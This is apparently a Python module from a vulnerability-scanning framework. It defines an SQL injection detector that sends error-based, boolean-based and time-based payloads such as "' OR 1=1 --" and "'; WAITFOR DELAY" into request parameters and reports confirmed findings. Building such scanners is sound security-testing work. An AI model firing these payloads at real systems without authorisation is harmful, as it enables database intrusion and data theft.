from typing import Dict, Any, List
from ...core.attack import Attack
from ...models import AttackResult, Severity, VulnerabilityStatus, AttackArtifact
from ...scenarios import SimpleScenario
from ...http_client import ResponseWrapper
import time
import random

class SQLInjectionAttack(Attack):
    """
    Gold Standard Implementation of SQL Injection (V2).
    Includes: 
     - Context-aware fingerprinting (skips if NoSQL/GraphQL detected).
     - Error-based, boolean-based, and time-based techniques.
     - Built-in verification loop.
    """
    ID = "sql_injection"
    NAME = "SQL Injection (Advanced)"
    DESCRIPTION = "Attempts to manipulate backend database queries via user input."
    SEVERITY = Severity.CRITICAL
    TAGS = ["sqli", "database", "injection", "owasp-top-10"]

    # --- KNOWLEDGE BASE ---
    ERROR_SIGNATURES = [
        "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation mark",
        "ora-01756", "pl/sql", "pg_query", "microsoft odbc sql server driver"
    ]
    
    PAYLOADS_BOOLEAN = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "admin' --",
        "' OR 'x'='x"
    ]
    
    PAYLOADS_TIME = [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT pg_sleep(5)--",
        "' AND SLEEP(5)--",
        "\" AND SLEEP(5)--"
    ]

    def fingerprint(self, scenario: SimpleScenario) -> bool:
        """
        Skip if the endpoint is known to be NoSQL or GraphQL.
        """
        # 1. Tech Stack Check
        if self.context.is_stack_present("mongo") or self.context.is_stack_present("dynamodb"):
            if self.context.is_stack_present("sql") or self.context.is_stack_present("postgres"):
                return True # Hybrid stack, run both
            return False

        # 2. Endpoint Pattern Check
        url = scenario.target.lower()
        if "graphql" in url or ".json" in url:
            # Heuristic: Less likely to be classic SQLi, but still possible.
            # We'll allow it but lower confidence unless specific SQL indicators found.
            pass

        return True

    def execute(self, scenario: SimpleScenario) -> AttackResult:
        # 1. BASELINE
        baseline = self.client.send(scenario.method, scenario.target, 
                                  params=scenario.config.get("params"), 
                                  json_body=scenario.config.get("json_body"))
        
        # 2. ERROR-BASED FUZZING
        fuzz_payload = "'"
        resp_error = self._inject(scenario, fuzz_payload)
        
        # Check for error signatures
        for sig in self.ERROR_SIGNATURES:
            if sig in resp_error.text.lower() and sig not in baseline.text.lower():
                return self._create_finding(
                    scenario, 
                    variant="Error-Based SQLi", 
                    payload=fuzz_payload,
                    evidence=sig,
                    resp=resp_error
                )

        # 3. BOOLEAN-BASED
        # If baseline was 200 OK, try to break it and fix it
        if baseline.status_code == 200:
            for p in self.PAYLOADS_BOOLEAN:
                resp = self._inject(scenario, p)
                # Heuristic: If response length/status matches baseline closely (Logic True)
                if self._is_similar(baseline, resp):
                    # Now confirm with a logic FALSE
                    p_false = p.replace("1=1", "1=2").replace("'1'='1", "'1'='2")
                    resp_false = self._inject(scenario, p_false)
                    
                    if not self._is_similar(baseline, resp_false):
                        return self._create_finding(
                            scenario,
                            variant="Boolean-Based SQLi",
                            payload=p,
                            evidence="Different behavior for True vs False condition",
                            resp=resp
                        )

        # 4. TIME-BASED (Blind)
        # Only run if aggressive or if other checks failed
        if scenario.config.get("aggressive", False):
            for p in self.PAYLOADS_TIME:
                start = time.time()
                resp = self._inject(scenario, p)
                duration = time.time() - start
                
                if duration > 4.5: # 5s delay requested
                    return self._create_finding(
                        scenario,
                        variant="Time-Based Blind SQLi",
                        payload=p,
                        evidence=f"Response delayed by {duration:.2f}s",
                        resp=resp,
                        confidence=0.9
                    )

        return self._result(scenario, VulnerabilityStatus.SECURE)

    def _inject(self, scenario: SimpleScenario, payload: str) -> ResponseWrapper:
        """Helper to inject payload into first parameter found."""
        params = scenario.config.get("params", {}).copy()
        json_body = scenario.config.get("json_body", {}).copy()
        
        # Prioritize JSON injection if body exists
        if json_body:
            # Inject into first string value
            for k, v in json_body.items():
                if isinstance(v, str):
                    json_body[k] = v + payload
                    break
        elif params:
            for k, v in params.items():
                params[k] = v + payload
                break
        else:
            # Suffix URL if no params? Or skip.
            pass

        return self.client.send(scenario.method, scenario.target, params=params, json_body=json_body)

    def _is_similar(self, r1: ResponseWrapper, r2: ResponseWrapper) -> bool:
        """Simple structural similarity check."""
        return abs(len(r1.text) - len(r2.text)) < 50 and r1.status_code == r2.status_code

    def _create_finding(self, scenario, variant, payload, evidence, resp, confidence=0.8):
        art = AttackArtifact(
            request_dump=resp.request_dump,
            response_dump=resp.response_dump,
            payload=payload,
            description=f"Triggered {variant}"
        )
        return self._result(
            scenario, 
            VulnerabilityStatus.CONFIRMED, # Auto-confirm high confidence signatures
            details=f"{variant} detected. Evidence: {evidence}",
            severity=Severity.CRITICAL,
            artifacts=[art],
            confidence=confidence
        )
